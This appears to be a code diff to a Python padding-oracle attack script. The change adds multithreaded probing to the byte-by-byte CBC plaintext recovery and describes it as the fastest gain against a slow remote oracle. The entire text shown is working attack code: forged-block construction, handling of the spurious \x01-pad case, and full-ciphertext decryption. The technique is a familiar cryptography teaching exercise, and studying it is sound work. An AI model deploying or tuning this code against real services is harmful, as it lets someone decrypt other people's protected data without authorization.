@@ -29,46 +29,74 @@ just to confirm the implementation works on your machine.
 from __future__ import annotations
 
 import os
+from concurrent.futures import ThreadPoolExecutor
 from typing import Callable
 
 Oracle = Callable[[bytes], bool]
 
 
-def attack_block(oracle: Oracle, prev: bytes, target: bytes, bs: int) -> bytes:
+def attack_block(
+    oracle: Oracle,
+    prev: bytes,
+    target: bytes,
+    bs: int,
+    workers: int = 1,
+) -> bytes:
     """Recover the plaintext of a single block ``target`` given the preceding
-    block ``prev``."""
+    block ``prev``. Pass ``workers > 1`` to probe the 256 candidates per byte
+    concurrently — fastest gain against a slow remote oracle."""
     intermediate = bytearray(bs)
+
+    def probe(forged: bytes) -> bool:
+        return oracle(forged + target)
+
     for byte_index in range(bs - 1, -1, -1):
         pad = bs - byte_index
-        for guess in range(256):
-            forged = bytearray(bs)
-            for k in range(byte_index + 1, bs):
-                forged[k] = intermediate[k] ^ pad
-            forged[byte_index] = guess
-            if oracle(bytes(forged) + target):
-                # Edge case on the final byte: a valid \x01 pad is always
-                # legal regardless of underlying byte. Tweak the previous
-                # byte to disambiguate.
-                if byte_index == bs - 1:
-                    probe = bytearray(forged)
-                    probe[byte_index - 1] ^= 0x01
-                    if not oracle(bytes(probe) + target):
-                        continue
-                intermediate[byte_index] = guess ^ pad
-                break
+        prefix = bytearray(bs)
+        for k in range(byte_index + 1, bs):
+            prefix[k] = intermediate[k] ^ pad
+
+        def make(guess: int) -> bytes:
+            f = bytearray(prefix)
+            f[byte_index] = guess
+            return bytes(f)
+
+        forged_set = [make(g) for g in range(256)]
+        if workers > 1:
+            with ThreadPoolExecutor(max_workers=workers) as ex:
+                results = list(ex.map(probe, forged_set))
         else:
+            results = [probe(f) for f in forged_set]
+
+        winner = None
+        for guess, hit in enumerate(results):
+            if not hit:
+                continue
+            if byte_index == bs - 1:
+                # Disambiguate the spurious \x01-pad case by perturbing the
+                # next byte and re-probing.
+                check = bytearray(forged_set[guess])
+                check[byte_index - 1] ^= 0x01
+                if not oracle(bytes(check) + target):
+                    continue
+            winner = guess
+            break
+
+        if winner is None:
             raise RuntimeError(f"no candidate at byte {byte_index}")
+        intermediate[byte_index] = winner ^ pad
+
     return bytes(p ^ i for p, i in zip(prev, intermediate))
 
 
-def attack(oracle: Oracle, ct: bytes, bs: int = 16) -> bytes:
+def attack(oracle: Oracle, ct: bytes, bs: int = 16, workers: int = 1) -> bytes:
     """Recover the full plaintext. ``ct`` must include the IV as block 0."""
     if len(ct) % bs:
         raise ValueError("ciphertext length not a multiple of block size")
     blocks = [ct[i:i + bs] for i in range(0, len(ct), bs)]
     pt = b""
     for i in range(1, len(blocks)):
-        pt += attack_block(oracle, blocks[i - 1], blocks[i], bs)
+        pt += attack_block(oracle, blocks[i - 1], blocks[i], bs, workers)
     return pt
 
 
